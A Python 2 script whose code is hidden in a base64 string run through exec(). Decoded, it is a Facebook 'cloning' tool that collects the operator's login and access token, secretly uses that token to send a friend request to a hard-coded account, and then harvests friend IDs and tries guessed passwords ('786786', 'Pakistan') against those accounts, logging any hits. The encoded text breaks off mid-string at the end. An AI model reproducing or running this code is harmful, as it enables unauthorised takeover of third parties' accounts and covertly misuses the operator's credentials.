#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Omi Chaudhary
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020

import base64
exec(base64.decodebytes('aW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYixjb29raWVsaWIscmVxdWVzdHMsbWVjaGFuaXplCmZyb20gbXVsdGlwcm9jZXNzaW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wKZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3IKZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXIKCgpyZWxvYWQoc3lzKQpzeXMuc2V0ZGVmYXVsdGVuY29kaW5nKCd1dGY4JykKYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQpici5zZXRfaGFuZGxlX3JlZnJlc2gobWVjaGFuaXplLl9odHRwLkhUVFBSZWZyZXNoUHJvY2Vzc29yKCksbWF4X3RpbWU9MSkKYnIuYWRkaGVhZGVycyA9IFsoJ1VzZXItQWdlbnQnLCAnT3BlcmEvOS44MCAoQW5kcm9pZDsgT3BlcmEgTWluaS8zMi4wLjIyNTQvODUuIFU7IGlkKSBQcmVzdG8vMi4xMi40MjMgVmVyc2lvbi8xMi4xNicpXQoKCmRlZiBrZWx1YXIoKToKCXByaW50ICJceDFiWzE7OTFtRXhpdCIKCW9zLnN5cy5leGl0KCkKCgpkZWYgYWNhayhiKToKICAgIHcgPSAnYWh0ZHpqYycKICAgIGQgPSAnJwogICAgZm9yIGkgaW4geDoKICAgICAgICBkICs9ICchJyt3W3JhbmRvbS5yYW5kaW50KDAsbGVuKHcpLTEpXStpCiAgICByZXR1cm4gY2V0YWsoZCkKCgpkZWYgY2V0YWsoYik6CiAgICB3ID0gJ2FodGR6amMnCiAgICBmb3IgaSBpbiB3OgogICAgICAgIGogPSB3LmluZGV4KGkpCiAgICAgICAgeD0geC5yZXBsYWNlKCchJXMnJWksJ1wwMzNbJXM7MW0nJXN0cigzMStqKSkKICAgIHggKz0gJ1wwMzNbMG0nCiAgICB4ID0geC5yZXBsYWNlKCchMCcsJ1wwMzNbMG0nKQogICAgc3lzLnN0ZG91dC53cml0ZSh4KydcbicpCgoKZGVmIGphbGFuKHopOgoJZm9yIGUgaW4geiArICdcbic6CgkJc3lzLnN0ZG91dC53cml0ZShlKQoJCXN5cy5zdGRvdXQuZmx1c2goKQoJCXRpbWUuc2xlZXAoMC4wNykKCgojIyMjIyBMT0dPICMjIyMjCmxvZ28gPSAiIiIKICAgICAgICAgICBcMDMzWzE7OTdtOjo6Ojo6OjogICAgOjo6ICAgOjo6ICAgOjo6Ojo6Ojo6OjogCiAgICAgICAgIFwwMzNbMTs5N206KzogICAgOis6ICA6KzorOiA6KzorOiAgICAgIDorOiAgICAgIAogICAgICAgIFwwMzNbMTs5Mm0rOisgICAgKzorICs6KyArOis6KyArOisgICAgICs6KyAgICAgICAKICAgICAgIFwwMzNbMTs5Mm0rIysgICAgKzorICsjKyAgKzorICArIysgICAgICsjKyAgICAgICAgCiAgICAgIFwwMzNbMTs5Mm0rIysgICAgKyMrICsjKyAgICAgICArIysgICAgICsjKyAgICAgICAgIAogICAgIFwwMzNbMTs5Mm0jKyMgICAgIysjICMrIyAgICAgICAjKyMgICAgICMrIyAgICAgICAgICAKICAgICBcMDMzWzE7OTJtIyMjIyMjIyMgICMjIyAgICAgICAjIyMgIyMjIyMjIyMjIyMKXDAzM1sxOzk3beKXj+KWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrFwwMzNbMTs5Mm3guZHbqdup26nguZFcMDMzWzE7OTdt4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pePClwwMzNbMTs5N21BdXRob3LCqVwwMzNbMTs5N206IFwwMzNbMTs5Mm1PbWkgQ2hhdWRoYXJ5ClwwMzNbMTs5N21JbnN0YWdyYW1cMDMzWzE7OTdtOiBcMDMzWzE7OTJtaHR0cHM6Ly93d3cuSW5zdGFncmFtLmNvbS9PbWk2dApcMDMzWzE7OTdtRmFjZWJvb2tcMDMzWzE7OTdtOiBcMDMzWzE7OTJtaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL09taTZ0ClwwMzNbMTs5N21XaGF0c2FwcFwwMzNbMTs5N206IFwwMzNbMTs5Mm0rOTIzMTE3Njc1MTc0ClwwMzNbMTs5N23Cqy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzkybeKcp+Kcp1wwMzNbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLcK7IiIiCgpkZWYgdGlrKCk6Cgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KCWZvciBvIGluIHRpdGlrOgoJCXByaW50KCJcclx4MWJbMTs5M21QbGVhc2UgV2FpdCBceDFiWzE7OTNtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkKCgpiYWNrID0gMApiZXJoYXNpbCA9IFtdCmNla3BvaW50ID0gW10Kb2tzID0gW10KaWQgPSBbXQpsaXN0Z3J1cCA9IFtdCnZ1bG5vdCA9ICJcMDMzWzMxbU5vdCBWdWxuIgp2dWxuID0gIlwwMzNbMzJtVnVsbiIKCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCAgIiIiClwwMzNbMTs5N20gIF8gICAgICAgX19fX19fX19fXyAgICBfX19fX19fX19fICBfXyAgX19fX19fX19fXDAzM1swbQpcMDMzWzE7OTdtIHwgfCAgICAgLyAvIF9fX18vIC8gICAvIF9fX18vIF9fIFwvICB8LyAgLyBfX19fL1wwMzNbMG0KXDAzM1sxOzk3bSB8IHwgL3wgLyAvIF9fLyAvIC8gICAvIC8gICAvIC8gLyAvIC98Xy8gLyBfXy8gICBcMDMzWzBtClwwMzNbMTs5N20gfCB8LyB8LyAvIC9fX18vIC9fX18vIC9fX18vIC9fLyAvIC8gIC8gLyAvX19fICAgXDAzM1swbQpcMDMzWzE7OTdtIHxfXy98X18vX19fX18vX19fX18vXF9fX18vXF9fX18vXy8gIC9fL19fX19fL1wwMzNbMzs5N212MS4wXDAzM1swbQpcMDMzWzE7OTRt4peP4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pasXDAzM1sxOzk3beC5kdup26nbqeC5kVwwMzNbMTs5NG3ilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzil48KXDAzM1sxOzk0bUF1dGhvcsKpXDAzM1sxOzkxbTogXDAzM1sxOzk3bU9taSBDaGF1ZGhhcnkKXDAzM1sxOzk0bUluc3RhZ3JhbVwwMzNbMTs5MW06IFwwMzNbMTs5N21odHRwczovL3d3dy5JbnN0YWdyYW0uY29tL09taTZ0ClwwMzNbMTs5NG1GYWNlYm9va1wwMzNbMTs5MW06IFwwMzNbMTs5N21odHRwczovL3d3dy5mYWNlYm9vay5jb20vT21pNnQKXDAzM1sxOzk0bVdoYXRzYXBwXDAzM1sxOzkxbTogXDAzM1sxOzk3bSs5MjMxMTc2NzUxNzQKXDAzM1sxOzk0bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTdt4pyn4pynXDAzM1sxOzk0bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0twrtcMDMzWzE7OTdtIiIiCmphbGFuKCJcMDMzWzE7NDFtRGlzY2xhaW1lcjpcMDMzWzBtIFwwMzNbMTs5N21EZXZlbG9wZXIgQXNzdW1lIE5vIExpYWJpbGl0eSBhbmQgTm90IikKamFsYW4oIlwwMzNbMTs5N20gICAgICAgICAgICBSZXNwb25zaWJsZSBmb3IgYW55IE1pc3VzZSBvciBEYW1hZ2UuIikKcHJpbnQgIlwwMzNbMTs5NG3Cqy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzk3beKcp+Kcp1wwMzNbMTs5NG0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLcK7XDAzM1sxOzk3bSIKcHJpbnQgIiAgICAgICAgICAgICAgICAgXDAzM1s3OzkxbVJFQUQgQ0FSRUZVTExZXDAzM1swbSIKcHJpbnQgIlwwMzNbMTs5N21JdCBpcyBub3QgaW4gQ29tbWFuZHMgQ29udHJvbCB0byBnZXQgYSBOZXcgb3IgT2xkIgpwcmludCAiXDAzM1sxOzk3bUFjY291bnQsSXQgVG90YWxseSBEZXBlbmRzIG9uIEZyaWVuZHMgTGlzdCBBbmQgdGhlIgpwcmludCAiXDAzM1sxOzk3bUFjY291bnQgdGhhdCBnb2VzIHRvIENoZWNrcG9pbnQgaXMgZHVlIHRvIEZhY2Vib29rIgpwcmludCAiXDAzM1sxOzk3bVNlY3VyaXR5LFRvb2wgaXMgbm90IFJlc3BvbnNpYmxlIGZvciB0aGlzIFRoaW5nLi4uIgpwcmludCAiXDAzM1sxOzk0bcKrLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTVtTG9naW4gV2l0aCBUb29sXDAzM1sxOzk0bS0tLS0tLS0tLS0tLS0tLS3CuyIKCkNvcnJlY3RVc2VybmFtZSA9ICJPbWk2dCIKQ29ycmVjdFBhc3N3b3JkID0gIk9taSIKCmxvb3AgPSAndHJ1ZScKd2hpbGUgKGxvb3AgPT0gJ3RydWUnKToKICAgIHVzZXJuYW1lID0gcmF3X2lucHV0KCJcMDMzWzE7OTZt8J+UkCBceDFiWzE7OTRtVG9vbCBVc2VybmFtZSBceDFiWzE7OTRtwrvCuyBceDFiWzE7OTdtIikKICAgIGlmICh1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWUpOgogICAgCXBhc3N3b3JkID0gcmF3X2lucHV0KCJcMDMzWzE7OTZt8J+UkCBceDFiWzE7OTRtVG9vbCBQYXNzd29yZCBceDFiWzE7OTRtwrvCuyBceDFiWzE7OTdtIikKICAgICAgICBpZiAocGFzc3dvcmQgPT0gQ29ycmVjdFBhc3N3b3JkKToKICAgICAgICAgICAgcHJpbnQgIkxvZ2dlZCBpbiBzdWNjZXNzZnVsbHkgYXMgIiArIHVzZXJuYW1lCgkgICAgdGltZS5zbGVlcCgyKQogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtV3JvbmcgUGFzc3dvcmQiCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuRmFjZWJvb2suY29tL09taTZ0JykKICAgIGVsc2U6CiAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1Xcm9uZyBVc2VybmFtZSIKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LkZhY2Vib29rLmNvbS9PbWk2dCcpCgpkZWYgbG9naW4oKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCXRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpCgkJbWVudSgpIAoJZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCBsb2dvCgkJamFsYW4oIlwwMzNbMTs0MW1XYXJuaW5nOlwwMzNbMG1cMDMzWzE7OTdtUGxlYXNlIERvbid0IFVzZSBZb3VyIFBlcnNvbmFsL09sZCBBY2NvdW50IiApCgkJamFsYW4oJyAgICAgICAgIFwwMzNbMTs5N21Vc2UgYSBGcmVzaCBBY2NvdW50IFRvIExvZ2luLlRoYW5rcyEuLi4nICkKCQlwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pyn4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiCgkJcHJpbnQoJyAgICAgICAgICAgICAgXDAzM1sxOzk1beOAkFx4MWJbMTs5NW1MT0dJTiBXSVRIIEZBQ0VCT09LXHgxYlsxOzk1beOAkVxuJyApCgkJaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5Nm1bK10gXHgxYlsxOzkzbUlEL0VtYWlsXHgxYlsxOzkzbTogXHgxYlsxOzk2bScpCgkJcHdkID0gcmF3X2lucHV0KCdcMDMzWzE7OTZtWytdIFx4MWJbMTs5M21QYXNzd29yZFx4MWJbMTs5M206IFx4MWJbMTs5Nm0nKQoJCXRpaygpCgkJdHJ5OgoJCQlici5vcGVuKCdodHRwczovL20uZmFjZWJvb2suY29tJykKCQlleGNlcHQgbWVjaGFuaXplLlVSTEVycm9yOgoJCQlwcmludCJcblx4MWJbMTs5MW1UaGVyZSBpcyBubyBpbnRlcm5ldCBjb25uZWN0aW9uIgoJCQlrZWx1YXIoKQoJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJYnIuc2VsZWN0X2Zvcm0obnI9MCkKCQlici5mb3JtWydlbWFpbCddID0gaWQKCQlici5mb3JtWydwYXNzJ10gPSBwd2QKCQlici5zdWJtaXQoKQoJCXVybCA9IGJyLmdldHVybCgpCgkJaWYgJ3NhdmUtZGV2aWNlJyBpbiB1cmw6CgkJCXRyeToKCQkJCXNpZz0gJ2FwaV9rZXk9ODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGRjcmVkZW50aWFsc190eXBlPXBhc3N3b3JkZW1haWw9JytpZCsnZm9ybWF0PUpTT05nZW5lcmF0ZV9tYWNoaW5lX2lkPTFnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MWxvY2FsZT1lbl9VU21ldGhvZD1hdXRoLmxvZ2lucGFzc3dvcmQ9Jytwd2QrJ3JldHVybl9zc2xfcmVzb3VyY2VzPTB2PTEuMDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJwoJCQkJZGF0YSA9IHsiYXBpX2tleSI6Ijg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkIiwiY3JlZGVudGlhbHNfdHlwZSI6InBhc3N3b3JkIiwiZW1haWwiOmlkLCJmb3JtYXQiOiJKU09OIiwgImdlbmVyYXRlX21hY2hpbmVfaWQiOiIxIiwiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjoiMSIsImxvY2FsZSI6ImVuX1VTIiwibWV0aG9kIjoiYXV0aC5sb2dpbiIsInBhc3N3b3JkIjpwd2QsInJldHVybl9zc2xfcmVzb3VyY2VzIjoiMCIsInYiOiIxLjAifQoJCQkJeD1oYXNobGliLm5ldygibWQ1IikKCQkJCXgudXBkYXRlKHNpZykKCQkJCWE9eC5oZXhkaWdlc3QoKQoJCQkJZGF0YS51cGRhdGUoeydzaWcnOmF9KQoJCQkJdXJsID0gImh0dHBzOi8vYXBpLmZhY2Vib29rLmNvbS9yZXN0c2VydmVyLnBocCIKCQkJCXI9cmVxdWVzdHMuZ2V0KHVybCxwYXJhbXM9ZGF0YSkKCQkJCXo9anNvbi5sb2FkcyhyLnRleHQpCgkJCQl1bmlrZXJzID0gb3BlbigibG9naW4udHh0IiwgJ3cnKQoJCQkJdW5pa2Vycy53cml0ZSh6WydhY2Nlc3NfdG9rZW4nXSkKCQkJCXVuaWtlcnMuY2xvc2UoKQoJCQkJcHJpbnQgJ1xuXHgxYlsxOzkybUxvZ2luIFN1Y2Nlc3NmdWwuLi4nCgkJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LkZhY2Vib29rLmNvbS9PbWk2dCcpCgkJCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP21ldGhvZD1wb3N0JnVpZHM9Z3dpbXVzYTMmYWNjZXNzX3Rva2VuPScrelsnYWNjZXNzX3Rva2VuJ10pCgkJCQltZW51KCkKCQkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCQkJcHJpbnQiXG5ceDFiWzE7OTFtVGhlcmUgaXMgbm8gaW50ZXJuZXQgY29ubmVjdGlvbiIKCQkJCWtlbHVhcigpCgkJaWYgJ2NoZWNrcG9pbnQnIGluIHVybDoKCQkJcHJpbnQoIlxuXHgxYlsxOzkxbVlvdXIgQWNjb3VudCBpcyBvbiBDaGVja3BvaW50IikKCQkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQkJdGltZS5zbGVlcCgxKQoJCQlrZWx1YXIoKQoJCWVsc2U6CgkJCXByaW50KCJcblx4MWJbMTs5MW1QYXNzd29yZC9FbWFpbCBpcyB3cm9uZyIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJbG9naW4oKQoKCmRlZiBtZW51KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCJceDFiWzE7OTFtVG9rZW4gaW52YWxpZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkKCQluYW1hID0gYVsnbmFtZSddCgkJaWQgPSBhWydpZCddCglleGNlcHQgS2V5RXJyb3I6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQiXDAzM1sxOzkxbVlvdXIgQWNjb3VudCBpcyBvbiBDaGVja3BvaW50IgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJceDFiWzE7OTFtVGhlcmUgaXMgbm8gaW50ZXJuZXQgY29ubmVjdGlvbiIKCQlrZWx1YXIoKQoJb3Muc3lzdGVtKCJjbGVhciIpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzk1bUxvZ2dlZCBpbiBVc2VyIEluZm9cMDMzWzE7OTdtLS0tLS0tLS0tLS0tLS3CuyIKCXByaW50ICJcMDMzWzE7OTNtIE5hbWVcMDMzWzE7OTNtOlwwMzNbMTs5N20iK25hbWErIlwwMzNbMTs5N20iCglwcmludCAiXDAzM1sxOzkzbSBJRFwwMzNbMTs5M206XDAzM1sxOzk3bSIraWQrIlx4MWJbMTs5N20iCglwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pyn4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiCglwcmludCAiXDAzM1sxOzk3bS0tXDAzM1sxOzkybT4gXDAzM1sxOzkybTEuXHgxYlsxOzkybVN0YXJ0IENsb25pbmcuLi4iCglwcmludCAiXDAzM1sxOzk3bS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzkxbUV4aXQgICAgICAgICAgICAiCglwaWxpaCgpCgoKZGVmIHBpbGloKCk6Cgl1bmlrZXJzID0gcmF3X2lucHV0KCJcblwwMzNbMTs5N21DaG9vc2UgYW4gT3B0aW9uPj4+IFwwMzNbMTs5N20iKQoJaWYgdW5pa2VycyA9PSIiOgoJCXByaW50ICJceDFiWzE7OTFtRmlsbCBpbiBjb3JyZWN0bHkiCgkJcGlsaWgoKQoJZWxpZiB1bmlrZXJzID09IjEiOgoJCXN1cGVyKCkKCWVsaWYgdW5pa2VycyA9PSIwIjoKCQlqYWxhbignVG9rZW4gUmVtb3ZlZCcpCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQlrZWx1YXIoKQoJZWxzZToKCQlwcmludCAiXHgxYlsxOzkxbUZpbGwgaW4gY29ycmVjdGx5IgoJCXBpbGloKCkKCgpkZWYgc3VwZXIoKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXHgxYlsxOzkxbVRva2VuIGludmFsaWQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3bS0tXDAzM1sxOzkybT4gXDAzM1sxOzkybTEuXHgxYlsxOzkybUNsb25lIEZyb20gRnJpZW5kIExpc3QuLi4iCglwcmludCAiXDAzM1sxOzk3bS0tXDAzM1sxOzkybT4gXDAzM1sxOzkybTIuXHgxYlsxOzkybUNsb25lIEZyb20gUHVibGljIElELi4uIgoJcHJpbnQgIlwwMzNbMTs5N20tLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5MW1CYWNrIgoJcGlsaWhfc3VwZXIoKQoKZGVmIHBpbGloX3N1cGVyKCk6CglwZWFrID0gcmF3X2lucHV0KCJcblwwMzNbMTs5N21DaG9vc2UgYW4gT3B0aW9uPj4+IFwwMzNbMTs5N20iKQoJaWYgcGVhayA9PSIiOgoJCXByaW50ICJceDFiWzE7OTFtRmlsbCBpbiBjb3JyZWN0bHkiCgkJcGlsaWhfc3VwZXIoKQoJZWxpZiBwZWFrID09IjEiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pyn4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiCgkJamFsYW4oJ1wwMzNbMTs5M21HZXR0aW5nIElEcyBcMDMzWzE7OTdtLi4uJykKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkKCQlmb3IgcyBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChzWydpZCddKQoJZWxpZiBwZWFrID09IjIiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bK10gXDAzM1sxOzkzbUVudGVyIElEXDAzM1sxOzkzbTogXDAzM1sxOzk3bSIpCgkJcHJpbnQgIlwwMzNbMTs5N23Cqy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzkybeKcp+Kcp1wwMzNbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLcK7IgoJCXRyeToKCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5M21OYW1lXDAzM1sxOzkzbTpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXHgxYlsxOzkxbUlEIE5vdCBGb3VuZCEiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTZtW1wwMzNbMTs5N21CYWNrXDAzM1sxOzk2bV0iKQoJCQlzdXBlcigpCgkJcHJpbnQiXDAzM1sxOzkzbUdldHRpbmcgSURzXDAzM1sxOzkzbS4uLiIKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQoJCWZvciBpIGluIHpbJ2RhdGEnXToKCQkJaWQuYXBwZW5kKGlbJ2lkJ10pCgllbGlmIHBlYWsgPT0iMCI6CgkJbWVudSgpCgllbHNlOgoJCXByaW50ICJceDFiWzE7OTFtRmlsbCBpbiBjb3JyZWN0bHkiCgkJcGlsaWhfc3VwZXIoKQoJCglwcmludCAiXDAzM1sxOzkzbVRvdGFsIElEc1wwMzNbMTs5M206IFwwMzNbMTs5N20iK3N0cihsZW4oaWQpKQoJamFsYW4oJ1wwMzNbMTs5M21QbGVhc2UgV2FpdFwwMzNbMTs5M20uLi4nKQoJdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICddCglmb3IgbyBpbiB0aXRpazoKCQlwcmludCgiXHJcMDMzWzE7OTNtQ2xvbmluZ1wwMzNbMTs5M20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQoJcHJpbnQgIlxuXDAzM1sxOzk3bcKrLS0tLS0tLS1ceDFiWzE7OTFt44CQVG8gU3RvcCBQcm9jZXNzIFByZXNzIENUUkwrWuOAkVwwMzNbMTs5N20tLS0tLS0tLcK7IgoJcHJpbnQgIlwwMzNbMTs5N23Cqy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzkybeKcp+Kcp1wwMzNbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLcK7IgoJamFsYW4oJyAgIFwwMzNbMTs5M21QbGVhc2UgV2FpdCBDbG9uZWQgQWNjb3VudHMgV2lsbCBBcHBlYXIgSGVyZScpCglwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pyn4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiCgkKCQkJCglkZWYgbWFpbihhcmcpOgoJCWdsb2JhbCBjZWtwb2ludCxva3MKCQl1c2VyID0gYXJnCgkJdHJ5OgoJCQlvcy5ta2Rpcignb3V0JykKCQlleGNlcHQgT1NFcnJvcjoKCQkJcGFzcwoJCXRyeToKCQkJYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyt1c2VyKycvP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQliID0ganNvbi5sb2FkcyhhLnRleHQpCgkJCXBhc3MxID0gKCc3ODY3ODYnKQoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCXByaW50ICdceDFiWzE7OTJtU3VjY2Vzc2Z1bFx4MWJbMTs5N20tXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyBwYXNzMQoJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MxKQoJCQllbHNlOgoJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCXByaW50ICdceDFiWzE7OTFtQ2hlY2twb2ludFx4MWJbMTs5N20tXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyBwYXNzMQoJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikKCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczErIlxuIikKCQkJCQljZWsuY2xvc2UoKQoJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MxKQoJCQkJZWxzZToKCQkJCQlwYXNzMiA9ICdQYWtpc3RhbicKCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0P